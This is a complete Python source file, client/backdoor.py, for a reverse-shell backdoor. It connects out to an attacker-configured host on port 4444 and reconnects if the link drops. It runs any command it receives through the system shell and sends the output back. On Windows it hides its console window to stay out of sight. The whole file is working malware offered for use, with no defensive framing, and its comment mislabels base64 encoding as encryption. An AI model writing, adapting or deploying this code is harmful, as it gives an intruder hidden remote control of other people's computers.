# client/backdoor.py

import socket
import subprocess
import os
import sys
import threading
import time
import base64

# === Configuration ===
SERVER_HOST = "YOUR_IP"      
SERVER_PORT = 4444           
RECONNECT_DELAY = 10         

# === Encrypted Send/Receive ===
def reliable_send(sock, data):
    encoded = base64.b64encode(data.encode())
    sock.send(encoded)

def reliable_recv(sock):
    data = b""
    while True:
        try:
            chunk = sock.recv(1024)
            if not chunk:
                break
            data += chunk
            try:
                return base64.b64decode(data).decode()
            except:
                continue
        except:
            break
    return ""

# === Execute Command ===
def execute_command(command):
    try:
        if command.lower() == "exit":
            sys.exit(0)
        result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
    except subprocess.CalledProcessError as e:
        result = e.output
    return result.decode()

# === Reverse Shell Logic ===
def connect_back():
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((SERVER_HOST, SERVER_PORT))
            reliable_send(sock, "[*] Connection Established from " + socket.gethostname())

            while True:
                command = reliable_recv(sock)
                if not command:
                    break

                output = execute_command(command)
                if not output:
                    output = "[!] No output or invalid command"

                reliable_send(sock, output)

        except socket.error:
            time.sleep(RECONNECT_DELAY)
        finally:
            try:
                sock.close()
            except:
                pass

# === Run in Background Thread (Stealth) ===
if __name__ == "__main__":
    try:
        import ctypes
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    except:
        pass

    
    threading.Thread(target=connect_back, daemon=True).start()
    while True:
        time.sleep(9999)  
